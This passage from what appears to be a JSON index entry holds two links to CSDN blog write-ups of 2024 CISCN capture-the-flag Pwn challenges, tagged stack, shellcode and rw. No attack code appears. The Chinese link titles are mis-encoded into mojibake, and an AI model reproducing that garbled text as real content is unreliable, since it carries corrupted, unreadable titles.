data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkwNjUzMy9hcnRpY2xlL2RldGFpbHMvMTM5OTM3Mjg4P2NzZG5fc2hhcmVfdGFpbD0lN0IlMjJ0eXBlJTIyJTNBJTIyYmxvZyUyMiUyQyUyMnJUeXBlJTIyJTNBJTIyYXJ0aWNsZSUyMiUyQyUyMnJJZCUyMiUzQSUyMjEzOTkzNzI4OCUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMndlaXhpbl80NTkwNjUzMyUyMiU3RA==\">2024 CISCN åä¸œåŒ—åˆ†åŒºèµ› - Ahisec-CSDN åšå®¢</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk5MzAwMDA=\">2024 å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆciscnï¼‰åŠå†³èµ›åä¸œåŒ—èµ›åŒº Pwn é¢˜è§£ - CSDN åšå®¢</span></p>\n",
            "tags": [
                "æ ˆ",
                "shellcode",
                "rw"
            ]
        }
    ]
}